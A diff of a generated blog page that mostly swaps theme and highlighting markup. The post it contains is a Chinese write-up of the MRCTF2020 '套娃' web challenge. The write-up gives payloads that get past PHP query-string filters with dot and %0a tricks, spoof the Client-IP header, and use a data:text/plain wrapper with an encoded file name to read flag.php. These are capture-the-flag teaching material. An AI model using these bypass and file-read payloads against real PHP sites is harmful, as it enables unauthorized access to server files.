@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -172,7 +165,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0087.jpg') no-repeat center center;
+         style="background: url('https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152231002.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      400 字
+      440 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      7
        分钟
     </span>
   
@@ -245,9 +238,15 @@
             <!-- SEO header -->
             <h1 style="display: none">MRCTF2020套娃</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p>打开是这样：<br><img src="https://ftp.bmp.ovh/imgs/2021/03/483e33b7c3964736.png" srcset="/img/loading.gif"><br>查看源码<img src="https://ftp.bmp.ovh/imgs/2021/03/eb6c980855779342.png" srcset="/img/loading.gif">       </p>
-<pre><code>http://localhost/aaa/index.php?p=222&amp;q=333
+<div class="hljs"><pre><code>http://localhost/aaa/index.php?p=222&amp;q=333
 结果：
 $_SERVER[&#39;QUERY_STRING&#39;] = &quot;p=222&amp;q=333&quot;;
 $_SERVER[&#39;REQUEST_URI&#39;]  = &quot;/aaa/index.php?p=222&amp;q=333&quot;;
@@ -259,54 +258,54 @@ $_SERVER[&#39;PHP_SELF&#39;]     = &quot;/aaa/index.php&quot;;
 $_SERVER[&quot;QUERY_STRING&quot;]  获取查询 语句，获取的是?后面的值
 $_SERVER[&quot;REQUEST_URI&quot;]   获取 http://localhost 后面的值，包括/
 $_SERVER[&quot;SCRIPT_NAME&quot;]   获取当前脚本的路径，如：index.php
-$_SERVER[&quot;PHP_SELF&quot;]      当前正在执行脚本的文件名       </code></pre>
+$_SERVER[&quot;PHP_SELF&quot;]      当前正在执行脚本的文件名       </code></pre></div>
 <p>传入<code>b_u_p_t</code>,但不能有<code>_</code>和<code>%5f</code><br>可以将<code>_</code>替换为<code>%20</code>、<code>%5F</code>、<code>.</code>,php解析时会将其转换为<code>_</code><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html?tdsourcetag=s_pcqq_aiomsg">php字符串解析特性</a><br>下面的if用<code>%0a</code>—&gt;换行符绕过<br>payload：<code>?b.u.p.t=23333%0a</code></p>
-<pre><code>FLAG is in secrettw.php    </code></pre>
+<div class="hljs"><pre><code>FLAG is in secrettw.php    </code></pre></div>
 <p>查看源码<br><img src="https://ftp.bmp.ovh/imgs/2021/03/825742d64ca82ac5.png" srcset="/img/loading.gif"><br>放入控制台，回车<br><img src="https://ftp.bmp.ovh/imgs/2021/03/7043aa313eed9a53.png" srcset="/img/loading.gif"><br>随便传个值，出现源码   </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token keyword">include</span> <span class="token single-quoted-string string">'takeip.php'</span><span class="token punctuation">;</span>
-<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token keyword">include</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+error_reporting(<span class="hljs-number">0</span>); 
+<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;
+ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); 
+<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;
 
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Merak'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token punctuation">&#125;</span> 
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; 
+    highlight_file(<span class="hljs-keyword">__FILE__</span>); 
+    <span class="hljs-keyword">die</span>(); 
+&#125; 
 
 
-<span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
-    <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-    <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span> 
-    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
-        <span class="token variable">$re</span> <span class="token punctuation">.</span><span class="token operator">=</span> chr <span class="token punctuation">(</span> ord <span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> 
-    <span class="token punctuation">&#125;</span> 
-    <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span> 
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">echo</span> <span class="token single-quoted-string string">'Local access only!'</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br/>"</span><span class="token punctuation">;</span>
-<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!=</span><span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">)</span>
-<span class="token keyword">echo</span> <span class="token double-quoted-string string">"Sorry,you don't have permission!  Your ip is :"</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'127.0.0.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'2333'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'todat is a happy day'</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-<span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your REQUEST is:"</span><span class="token punctuation">.</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span></code></pre></code></pre>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params">$v</span>)</span>&#123; 
+    $v = base64_decode($v); 
+    $re = <span class="hljs-string">&#x27;&#x27;</span>; 
+    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; 
+        $re .= chr ( ord ($v[$i]) + $i*<span class="hljs-number">2</span> ); 
+    &#125; 
+    <span class="hljs-keyword">return</span> $re; 
+&#125;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;
+$ip = getIp();
+<span class="hljs-keyword">if</span>($ip!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;
+<span class="hljs-keyword">if</span>($ip === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="hljs-string">&#x27;file&#x27;</span>]);
+<span class="hljs-keyword">echo</span> file_get_contents(change($_GET[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>加个请求头：<code>Client-IP: 127.0.0.1</code>         </p>
 <p>change解密函数，据此写出加密函数      </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params">$v</span>)</span>&#123; 
 
-    <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
-        <span class="token variable">$re</span> <span class="token punctuation">.</span><span class="token operator">=</span> chr <span class="token punctuation">(</span> ord <span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> 
-    <span class="token punctuation">&#125;</span> 
-    <span class="token variable">$re</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span> 
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    $re = <span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; 
+        $re .= chr ( ord ($v[$i]) - $i*<span class="hljs-number">2</span> ); 
+    &#125; 
+    $re=base64_encode($re);
+    <span class="hljs-keyword">return</span> $re; 
+&#125;
+$flag = change(<span class="hljs-string">&#x27;flag.php&#x27;</span>);
 
-<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span></code></pre></code></pre>
+<span class="hljs-keyword">echo</span> $flag;
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>file_get那里可以用协议提交<code>php://input</code>或者<code>data:text/plain</code> </p>
 <p>payload1:<code>?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code><br>payload2:<img src="https://ftp.bmp.ovh/imgs/2021/03/1ba0210e72704c0b.png" srcset="/img/loading.gif"></p>
 
@@ -427,7 +426,7 @@ $_SERVER[&quot;PHP_SELF&quot;]      当前正在执行脚本的文件名       <
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -453,8 +452,6 @@ $_SERVER[&quot;PHP_SELF&quot;]      当前正在执行脚本的文件名       <
 
 
 
-  
-    
   
 
 
